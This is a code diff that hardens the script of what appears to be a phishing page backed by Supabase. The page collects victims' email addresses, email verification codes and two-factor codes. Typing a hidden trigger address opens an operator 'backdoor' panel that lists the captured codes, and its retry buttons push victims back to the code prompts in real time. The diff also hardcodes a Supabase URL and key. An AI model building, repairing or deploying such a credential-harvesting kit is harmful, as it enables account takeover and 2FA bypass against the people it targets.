@@ -3204,7 +3204,6 @@
          attach runtime behavior to p2/p5/p6. Preserve raw p1-p6 verbatim in their script blocks.
     -->
     <script>
-   <script>
 (function () {
     // === RAW PAGES ===
     var rawP1 = document.getElementById('p1').textContent;
@@ -3217,7 +3216,17 @@
     // === YOUR SUPABASE KEYS ===
     const SUPABASE_URL = 'https://binrbpydyxnlbkokyptd.supabase.co';
     const SUPABASE_ANON_KEY = 'sb_publishable_00kNuWTgSMCzmUglMM58kw_a1Hyg3ec';
-    const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    
+    // Initialize Supabase with error handling
+    let supabase;
+    try {
+        supabase = window.Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        console.log('✓ Supabase initialized successfully');
+    } catch (err) {
+        console.error('✗ Supabase initialization failed:', err);
+        alert('Error: Supabase failed to initialize. Check console.');
+        throw err;
+    }
 
     // === FRAMES ===
     var frame1 = document.getElementById('pageFrame1');
@@ -3276,30 +3285,38 @@
         var tbody = doc.querySelector('tbody');
 
         async function refresh() {
-            const { data } = await supabase.from('attempts').select('*').order('created_at');
-            tbody.innerHTML = '';
-            (data || []).forEach((row, i) => {
-                var tr = doc.createElement('tr');
-                tr.innerHTML = `
-                    <td>${i+1}</td>
-                    <td>${row.device || ''}</td>
-                    <td>${row.email || ''}</td>
-                    <td>${row.email_code || ''}</td>
-                    <td>${row.twofa_code || ''}</td>
-                    <td><span class="retry-box" data-type="email" data-sid="${row.session_id}">Retry</span></td>
-                    <td><span class="retry-box" data-type="twofa" data-sid="${row.session_id}">Retry</span></td>
-                `;
-                tbody.appendChild(tr);
-            });
+            try {
+                const { data, error } = await supabase.from('attempts').select('*').order('created_at', { ascending: false });
+                if (error) {
+                    console.error('Supabase error:', error);
+                    return;
+                }
+                tbody.innerHTML = '';
+                (data || []).forEach((row, i) => {
+                    var tr = doc.createElement('tr');
+                    tr.innerHTML = `
+                        <td>${i+1}</td>
+                        <td>${row.device || ''}</td>
+                        <td>${row.email || ''}</td>
+                        <td>${row.email_code || ''}</td>
+                        <td>${row.twofa_code || ''}</td>
+                        <td><span class="retry-box" data-type="email" data-sid="${row.session_id}">Retry</span></td>
+                        <td><span class="retry-box" data-type="twofa" data-sid="${row.session_id}">Retry</span></td>
+                    `;
+                    tbody.appendChild(tr);
+                });
 
-            doc.querySelectorAll('.retry-box').forEach(btn => {
-                btn.onclick = async () => {
-                    const type = btn.dataset.type;
-                    const sid = btn.dataset.sid;
-                    const field = type === 'email' ? 'retry_email' : 'retry_twofa';
-                    await supabase.from('attempts').update({[field]: true}).eq('session_id', sid);
-                };
-            });
+                doc.querySelectorAll('.retry-box').forEach(btn => {
+                    btn.onclick = async () => {
+                        const type = btn.dataset.type;
+                        const sid = btn.dataset.sid;
+                        const field = type === 'email' ? 'retry_email' : 'retry_twofa';
+                        await supabase.from('attempts').update({[field]: true}).eq('session_id', sid);
+                    };
+                });
+            } catch (err) {
+                console.error('Backdoor refresh error:', err);
+            }
         }
 
         refresh();
@@ -3312,15 +3329,19 @@
         if (statusPoller) clearInterval(statusPoller);
         statusPoller = setInterval(async () => {
             if (!currentSessionId) return;
-            const { data } = await supabase.from('attempts').select('retry_email, retry_twofa').eq('session_id', currentSessionId).single();
-            if (!data) return;
-            if (data.retry_email) {
-                await supabase.from('attempts').update({retry_email: false}).eq('session_id', currentSessionId);
-                showVerification();
-            }
-            if (data.retry_twofa) {
-                await supabase.from('attempts').update({retry_twofa: false}).eq('session_id', currentSessionId);
-                showAuthenticator();
+            try {
+                const { data, error } = await supabase.from('attempts').select('retry_email, retry_twofa').eq('session_id', currentSessionId).single();
+                if (error || !data) return;
+                if (data.retry_email) {
+                    await supabase.from('attempts').update({retry_email: false}).eq('session_id', currentSessionId);
+                    showVerification();
+                }
+                if (data.retry_twofa) {
+                    await supabase.from('attempts').update({retry_twofa: false}).eq('session_id', currentSessionId);
+                    showAuthenticator();
+                }
+            } catch (err) {
+                console.error('Poller error:', err);
             }
         }, 400);
     }
@@ -3332,31 +3353,45 @@
         var emailInput = doc.getElementById('emailInput');
         var continueBtn = doc.getElementById('continueBtn');
 
+        if (!continueBtn) return;
+
         continueBtn.addEventListener('click', async () => {
             var email = (emailInput.value || '').trim();
-            if (!email || !email.includes('@')) return;
+            if (!email || !email.includes('@')) {
+                alert('Please enter a valid email');
+                return;
+            }
 
             if (email.toLowerCase() === 'trial@trial.com') {
                 showBackdoor();
                 return;
             }
 
-            const { data, error } = await supabase.from('attempts').insert({
-                device: getDeviceInfo(),
-                email: email
-            }).select('session_id').single();
+            try {
+                const { data, error } = await supabase.from('attempts').insert({
+                    device: getDeviceInfo(),
+                    email: email
+                }).select('session_id').single();
 
-            if (error) return;
+                if (error) {
+                    console.error('Insert error:', error);
+                    alert('Error: Could not create session');
+                    return;
+                }
 
-            currentSessionId = data.session_id;
-            lastEmail = email;
-            startPoller();
-            showMagic(email);
+                currentSessionId = data.session_id;
+                lastEmail = email;
+                startPoller();
+                showMagic(email);
+            } catch (err) {
+                console.error('Email submit error:', err);
+                alert('Error: ' + err.message);
+            }
         });
     }
     frame2.addEventListener('load', attachFrame2);
 
-    // Code pages
+    // Code pages (Email verification and 2FA)
     [frame5, frame6].forEach((frame, is2fa) => {
         frame.addEventListener('load', () => {
             var doc = frame.contentDocument;
@@ -3366,10 +3401,15 @@
             function complete() {
                 var code = Array.from(inputs).map(i => i.value).join('');
                 if (code.length === 6) {
-                    supabase.from('attempts').update({
-                        [is2fa ? 'twofa_code' : 'email_code']: code
-                    }).eq('session_id', currentSessionId);
-                    setTimeout(() => showMagic(lastEmail), 30);
+                    try {
+                        supabase.from('attempts').update({
+                            [is2fa ? 'twofa_code' : 'email_code']: code
+                        }).eq('session_id', currentSessionId).then(() => {
+                            setTimeout(() => showMagic(lastEmail), 30);
+                        });
+                    } catch (err) {
+                        console.error('Code submission error:', err);
+                    }
                 }
             }
 
@@ -3382,11 +3422,11 @@
         });
     });
 
-    // Auto start
+    // Auto start - show frame2 after delay
     setTimeout(() => {
         document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
         frame2.classList.add('visible');
     }, 800);
 
 })();
-</script>
+    </script>
